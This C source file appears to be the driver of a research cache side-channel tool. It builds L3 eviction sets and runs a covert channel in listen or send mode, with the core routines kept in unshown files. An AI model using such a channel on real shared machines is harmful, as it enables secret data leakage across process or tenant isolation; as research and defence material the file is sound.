#include "attack.h"
#include <signal.h>

#define KEY	(27317)

int MODE = 0;
s_set **EVICTION_SETS[N_CACHE_SET_INDICES_MAX] = {NULL};
size_t N_EVICTION_SETS[N_CACHE_SET_INDICES_MAX] = {0};

int initialize(void) {
	// < 0 :	Error
	// == 0 :	Success
	s_set **potentially_conflict_sets = NULL;
	size_t n_potentially_conflict_sets = 0;
	s_set *conflict_set = NULL;
	size_t i, j;

	printf("< Initialize eviction sets >\n");
	srand(time(NULL));

	init_memory_again:
	// Initialize memory
	if(init_memory(rand() % (KEY + MODE)) < 0) {
		DEBUG_PRINT("\tinit_memory_info()\n");
		return -1;
	}

	// Get potentially conflict sets
	potentially_conflict_sets = get_potentially_conflict_sets(&n_potentially_conflict_sets);
	if(!potentially_conflict_sets) {
		DEBUG_PRINT("\tget_potentially_conflict_sets()\n");
		free_memory();
		goto init_memory_again;
	}

	for(i = 0; i < N_CACHE_SET_INDICES; i++) {
		// Get a conflict set
		conflict_set = get_conflict_set(potentially_conflict_sets[BASE_CACHE_INDEX + i]);
		if(!conflict_set) {
			DEBUG_PRINT("\tget_conflict_set()\n");
			for(j = 0; j < i; j++) {
				free_sets(EVICTION_SETS[j], N_EVICTION_SETS[j]);
				EVICTION_SETS[j] = NULL;
				N_EVICTION_SETS[j] = 0;
			}
			free_sets(potentially_conflict_sets, n_potentially_conflict_sets);
			free_memory();
			goto init_memory_again;
		}
		DEBUG_PRINT("\t(Found a conflict set for cache set #%lu)\n", BASE_CACHE_INDEX + i);

		// Get eviction sets from the conflict set
		EVICTION_SETS[i] = get_eviction_sets(potentially_conflict_sets[BASE_CACHE_INDEX + i], conflict_set, &N_EVICTION_SETS[i]);
		free_set(conflict_set);
		if(!EVICTION_SETS[i]) {
			DEBUG_PRINT("\tget_eviction_sets()\n");
			for(j = 0; j < i; j++) {
				free_sets(EVICTION_SETS[j], N_EVICTION_SETS[j]);
				EVICTION_SETS[j] = NULL;
				N_EVICTION_SETS[j] = 0;
			}
			free_sets(potentially_conflict_sets, n_potentially_conflict_sets);
			free_memory();
			goto init_memory_again;
		}
		DEBUG_PRINT("\t(Found eviction sets for cache set #%lu)\n", BASE_CACHE_INDEX + i);
	}
	free_sets(potentially_conflict_sets, n_potentially_conflict_sets);

	return 0;
}

int attack(void) {
	// < 0 :	Error
	// == 0 :	Success
	uint64_t *START_ADDR[N_CACHE_SET_INDICES_MAX][L3_CACHE_N_SLICES];
	size_t i, j;

	printf("< Start a covert channel >\n");
	// getchar();

	for(i = 0; i < N_CACHE_SET_INDICES; i++) {
		for(j = 0; j < N_EVICTION_SETS[i]; j++) {
			create_direction(EVICTION_SETS[i][j]);
			START_ADDR[i][j] = (uint64_t *)(EVICTION_SETS[i][j]->elements[0]);
		}
	}

	switch(MODE) {
		case 0:
			listen_covert_channel(START_ADDR);
			break;
		case 1:
			// listen(START_ADDR, FILE_PATH, MODE);
			break;
		case 2:
			send(START_ADDR);
			break;
		default:
			return -1;
	}

	return 0;
}

void finalize(void) {
	size_t i;

	printf("< Finalize >\n");
	for(i = 0; i < N_CACHE_SET_INDICES; i++) {
		free_sets(EVICTION_SETS[i], N_EVICTION_SETS[i]);
		EVICTION_SETS[i] = NULL;
		N_EVICTION_SETS[i] = 0;
	}
	free_memory();
}

void sig_handler(int sig) {
	finalize();
	exit(0);
}

int main(const int argc, char **argv) {
	int opt;

	signal(SIGINT, sig_handler);

	// Configure MODE, BASE_CACHE_INDEX, and N_CACHE_SET_INDICES
	MODE = 0;
	BASE_CACHE_INDEX = 0;
	N_CACHE_SET_INDICES = 1;
	while((opt = getopt(argc, argv, "b:c:so")) != -1) {
		switch(opt){
		case 'b':
			BASE_CACHE_INDEX = atoi(optarg);
			break;
		case 'c':
			N_CACHE_SET_INDICES = atoi(optarg);
			break;
		case 's':
			MODE = 1;
			break;
		case 'o':
			MODE = 2;
			break;
		}
	}
	if(N_CACHE_SET_INDICES < 1)
		N_CACHE_SET_INDICES = 1;
	else if(N_CACHE_SET_INDICES > N_CACHE_SET_INDICES_MAX)
		N_CACHE_SET_INDICES = N_CACHE_SET_INDICES_MAX;
	if(BASE_CACHE_INDEX + N_CACHE_SET_INDICES > N_CACHE_SET_INDICES_MAX)
		BASE_CACHE_INDEX = N_CACHE_SET_INDICES_MAX - N_CACHE_SET_INDICES;
	printf("Mode:\t%d\n", MODE);
	printf("Listening cache sets:\t%lu - %lu\n", BASE_CACHE_INDEX, BASE_CACHE_INDEX + N_CACHE_SET_INDICES - 1);

	// Find eviction sets
	if(initialize() < 0) {
		DEBUG_PRINT("initialize()\n");
		return -1;
	}

	// Take an attack
	if(attack() < 0) {
		DEBUG_PRINT("attack()");
		finalize();
		return -1;
	}

	// Finalize
	finalize();

	return 0;
}